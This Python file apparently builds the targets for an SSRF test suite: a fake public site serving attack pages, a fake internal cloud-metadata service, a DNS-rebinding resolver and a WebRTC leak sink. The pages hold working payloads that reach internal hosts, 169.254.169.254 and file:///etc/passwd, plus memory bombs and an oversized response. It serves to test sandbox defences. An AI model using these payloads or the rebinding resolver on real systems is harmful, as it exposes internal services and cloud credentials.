"""Test targets for the SSRF suite (stdlib only). Roles: web | secret | dns | udp.

web     the "public internet" site (11.11.11.10) serving attack pages
secret  an internal service / fake cloud metadata (172.31.50.10, 169.254.169.254, fd00:ec2::254) that must never be hit
dns     authoritative-ish resolver for *.fake (rebinding, mixed records, metadata, NAT64, v4-mapped ...)
udp     UDP sink on the sandbox network (WebRTC/STUN leak detector), with an HTTP /log on 8080
Every role exposes GET /log (JSON list of hits) and GET /log/reset on its HTTP port.
"""
import asyncio
import ipaddress
import re
import json
import struct
import sys
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlsplit
import socket
import threading

HITS: list[dict] = []
LOCK = threading.Lock()
ROLE = sys.argv[1]
CANARY = 9999

PAGES = {
    "/": "<body style='margin:0;background:#0a0'><h1 style='color:#fff'>PUBLIC OK</h1></body>",
    "/js-beacon": "<h1>js?</h1><script>fetch('/beacon?js=1');document.title='JS-RAN'</script><noscript>"
                  "<img src='/beacon?noscript=1'></noscript>",
    "/ssrf-subresources": """<h1>subresources</h1>
<img src="http://secret-app/img"><img src="http://172.31.50.10/img-ip"><img src="http://169.254.169.254/latest/meta-data/">
<img src="http://[fd00:ec2::254]/v6"><img src="http://meta.fake/"><img src="http://loopback.fake:80/">
<img src="http://127.0.0.1:9999/canary-img"><img src="http://localhost:9999/canary-localhost"><img src="http://[::1]:9999/c6">
<img src="http://0x7f.1:9999/c-hex"><img src="http://2130706433:9999/c-dec"><img src="http://egress:3129/health">
<img src="http://v6meta.fake/"><img src="http://mapped.fake/"><img src="http://nat64.fake/"><img src="http://mixed.fake/m">
<img src="http://cgnat.fake/"><img src="http://host.docker.internal/"><img src="http://secret-app:6379/">
<iframe src="http://secret-app/iframe"></iframe><iframe src="https://secret-app/iframe-tls"></iframe>
<link rel="stylesheet" href="http://secret-app/css"><script src="http://secret-app/js"></script>
<video src="http://secret-app/video"></video><object data="http://secret-app/object"></object>
<style>@import url("http://secret-app/import"); @font-face{font-family:x;src:url(http://secret-app/font)} body{font-family:x}</style>
<script>
fetch('http://secret-app/fetch', {mode:'no-cors'}).catch(()=>{});
fetch('http://169.254.169.254/latest/api/token', {method:'PUT', mode:'no-cors', headers:{'X-aws-ec2-metadata-token-ttl-seconds':'21600'}}).catch(()=>{});
var x = new XMLHttpRequest(); x.open('GET', 'http://secret-app/xhr'); x.send();
navigator.sendBeacon('http://secret-app/beacon', 'x');
new EventSource('http://secret-app/sse');
try { new Worker(URL.createObjectURL(new Blob(["fetch('http://secret-app/worker')"]))); } catch(e) {}
try { navigator.serviceWorker.register('/sw.js'); } catch(e) {}
fetch('/beacon?subres=done');
</script>""",
    "/sw.js": "self.addEventListener('install',()=>fetch('http://secret-app/sw'))",
    "/ws-attack": """<h1>ws</h1><script>
for (const u of ['ws://secret-app/ws', 'ws://172.31.50.10/ws', 'wss://secret-app/wss', 'ws://11.11.11.10/ws',
                 'ws://127.0.0.1:9999/ws']) {
  try { const s = new WebSocket(u); s.onopen = () => fetch('/beacon?ws_open=' + encodeURIComponent(u)); } catch (e) {}
}</script>""",
    "/webrtc-attack": """<h1>webrtc</h1><script>
(async () => {
  const report = (k, v) => fetch('/beacon?' + k + '=' + encodeURIComponent(v));
  const PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
  report('rtc_api', typeof PC);
  if (!PC) return;
  const pc = new PC({iceServers: [{urls: 'stun:udp-sink:3478'}, {urls: 'stun:172.31.70.20:3478'},
                                  {urls: 'turn:172.31.70.20:3478', username: 'u', credential: 'p'}]});
  pc.createDataChannel('x');
  pc.onicecandidate = e => { if (e.candidate) report('cand', e.candidate.candidate); };
  await pc.setLocalDescription(await pc.createOffer());
})();</script>""",
    "/webrtc-iframe": """<iframe srcdoc="<script>
const PC = window.RTCPeerConnection; fetch('http://11.11.11.10/beacon?iframe_rtc_api=' + typeof PC);
if (PC) { const pc = new PC({iceServers:[{urls:'stun:172.31.70.20:3478'}]}); pc.createDataChannel('x');
pc.createOffer().then(o => pc.setLocalDescription(o)); }
</script>"></iframe>""",
    "/popup": """<h1>popup</h1><a id=a href="http://11.11.11.10/popup-target-a" target="_blank">x</a><script>
window.open('http://11.11.11.10/popup-target-open');
document.getElementById('a').click();</script>""",
    "/download-click": """<h1>download</h1><a id=d href="/download" download>d</a><script>
document.getElementById('d').click();
const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob(['x'.repeat(1000)])); a.download = 'x.txt';
document.body.appendChild(a); a.click();</script>""",
    "/infinite": "<h1>loop</h1><script>while(true){}</script>",
    "/memory-bomb": "<h1>mem</h1><script>const a=[];while(true){a.push(new Array(1e6).fill(Math.random()))}</script>",
    "/nav-loop": "<script>location.href='/nav-loop?' + Math.random()</script>",
    "/cookie-banner": """<body style='margin:0;background:#fff'><h1>content</h1>
<div id="onetrust-banner-sdk" style="position:fixed;inset:0;background:#f00;z-index:99999">We value your privacy</div>
<div class="cc-window" style="position:fixed;bottom:0;left:0;right:0;height:200px;background:#f00">cookies</div></body>""",
    "/cookie-lock": """<body style='margin:0;overflow:hidden'><div style='height:5000px;background:#00f'>long</div></body>""",
    "/scheme-file": "<script>location.href='file:///etc/passwd'</script><h1>stay</h1>",
    "/scheme-data": "<script>location.href='data:text/html,<h1>DATA-PWNED</h1>'</script><h1>stay</h1>",
    "/scheme-chrome": "<script>location.href='chrome://version'</script><h1>stay</h1>",
    "/scheme-viewsource": "<script>location.href='view-source:http://secret-app/'</script><h1>stay</h1>",
    "/scheme-iframes": """<h1>frames</h1><iframe src="file:///etc/passwd"></iframe><iframe src="chrome://version"></iframe>
<iframe src="view-source:http://secret-app/vs"></iframe><iframe src="data:text/html,<script>fetch('http://secret-app/data-iframe')</script>"></iframe>""",
    "/print-css": """<style>@media print{body{background:#00f!important}} body{background:#0a0}</style><h1>print me</h1>""",
}


def tall(h: int) -> str:
    return (f"<body style='margin:0'><div style='height:{h}px;background:linear-gradient(#f00,#00f)'></div>"
            f"<img src='/beacon?tall_bottom=1' loading='lazy'></body>")


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def record(self, **extra):
        with LOCK:
            HITS.append({"role": ROLE, "path": self.path, "host": self.headers.get("Host"), "method": self.command,
                         "client": self.client_address[0], "upgrade": self.headers.get("Upgrade"),
                         "ua": self.headers.get("User-Agent"), "t": time.time(), **extra})

    def send(self, code, body: bytes, ctype="text/html", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def do_PUT(self):
        self.do_GET()

    def do_POST(self):
        self.do_GET()

    def do_GET(self):
        u = urlsplit(self.path)
        if u.path == "/log":
            with LOCK:
                return self.send(200, json.dumps(HITS).encode(), "application/json")
        if u.path == "/log/reset":
            with LOCK:
                HITS.clear()
            return self.send(200, b"[]", "application/json")
        self.record()
        if ROLE in ("secret", "udp"):
            return self.send(200, b"<h1 style='color:red'>TOP-SECRET-INTERNAL ami-0123 iam/security-credentials</h1>")
        q = parse_qs(u.query)
        if u.path == "/redirect":
            return self.send(302, b"", extra={"Location": q["to"][0]})
        if u.path == "/download":
            return self.send(200, b"x" * 1_000_000, "application/octet-stream",
                             {"Content-Disposition": 'attachment; filename="big.bin"'})
        if u.path == "/tall":
            return self.send(200, tall(int(q.get("h", ["100000"])[0])).encode())
        if u.path == "/slow":
            time.sleep(60)
            return self.send(200, b"slow")
        if u.path == "/huge":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            chunk = b"<p>" + b"A" * 65530 + b"</p>"
            try:
                for _ in range(5000):  # ~330 MB
                    self.wfile.write(chunk)
            except OSError:
                pass
            self.close_connection = True
            return
        if u.path in PAGES:
            return self.send(200, PAGES[u.path].encode())
        return self.send(200, b"<h1>ok</h1>")


class DualStackServer(ThreadingHTTPServer):
    address_family = socket.AF_INET6
    daemon_threads = True

    def server_bind(self):
        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        super().server_bind()


# ----------------------------------------------------------------------------------------------- DNS
REBIND: dict[str, int] = {}
A, AAAA = 1, 28
ZONE = {
    "public.fake": {A: ["11.11.11.10"]},
    "loopback.fake": {A: ["127.0.0.1"]},
    "meta.fake": {A: ["169.254.169.254"]},
    "mixed.fake": {A: ["11.11.11.10", "172.31.50.10"]},
    "cgnat.fake": {A: ["100.64.1.1"]},
    "v6meta.fake": {AAAA: ["fd00:ec2::254"]},
    "mapped.fake": {AAAA: ["::ffff:172.31.50.10"]},
    "nat64.fake": {AAAA: ["64:ff9b::a9fe:a9fe"]},
}


def dns_answer(data: bytes) -> bytes:
    tid, flags, qd = struct.unpack(">HHH", data[:6])
    i, labels = 12, []
    while data[i]:
        labels.append(data[i + 1:i + 1 + data[i]].decode().lower())
        i += 1 + data[i]
    qtype, qclass = struct.unpack(">HH", data[i + 1:i + 5])
    question = data[12:i + 5]
    name = ".".join(labels)
    with LOCK:
        HITS.append({"role": "dns", "name": name, "qtype": qtype, "t": time.time()})
    m = re.fullmatch(r"rebind(\d*)\.fake", name)
    if m and qtype == A:  # rebind.fake: public,private,... ; rebindN.fake: N-1 public answers then 1 private
        period = int(m.group(1) or 2)
        REBIND[name] = REBIND.get(name, 0) + 1
        ips = ["172.31.50.10"] if REBIND[name] % period == 0 else ["11.11.11.10"]
    elif m:
        ips = []
    elif name in ZONE:
        ips = ZONE[name].get(qtype, [])
    else:
        return struct.pack(">HHHHHH", tid, 0x8183, 1, 0, 0, 0) + question  # NXDOMAIN
    ans = b""
    for ip in ips:
        rdata = ipaddress.ip_address(ip).packed
        ans += struct.pack(">HHHIH", 0xC00C, qtype, 1, 0, len(rdata)) + rdata  # TTL 0
    return struct.pack(">HHHHHH", tid, 0x8580, 1, len(ips), 0, 0) + question + ans


class DnsProto(asyncio.DatagramProtocol):
    def connection_made(self, t):
        self.t = t

    def datagram_received(self, data, addr):
        try:
            self.t.sendto(dns_answer(data), addr)
        except Exception as e:
            print("dns error", e, flush=True)


class UdpSink(asyncio.DatagramProtocol):
    def datagram_received(self, data, addr):
        with LOCK:
            HITS.append({"role": "udp", "from": addr[0], "len": len(data), "t": time.time()})


def serve_http(port):
    DualStackServer(("::", port), Handler).serve_forever()


async def main():
    loop = asyncio.get_running_loop()
    if ROLE == "dns":
        await loop.create_datagram_endpoint(DnsProto, local_addr=("0.0.0.0", 53))
        threading.Thread(target=serve_http, args=(8080,), daemon=True).start()
    elif ROLE == "udp":
        await loop.create_datagram_endpoint(UdpSink, local_addr=("0.0.0.0", 3478))
        threading.Thread(target=serve_http, args=(8080,), daemon=True).start()
    else:
        for port in ([80, 6379, 443] if ROLE == "secret" else [80]):
            threading.Thread(target=serve_http, args=(port,), daemon=True).start()
    print(f"{ROLE} up", flush=True)
    await asyncio.Event().wait()


asyncio.run(main())
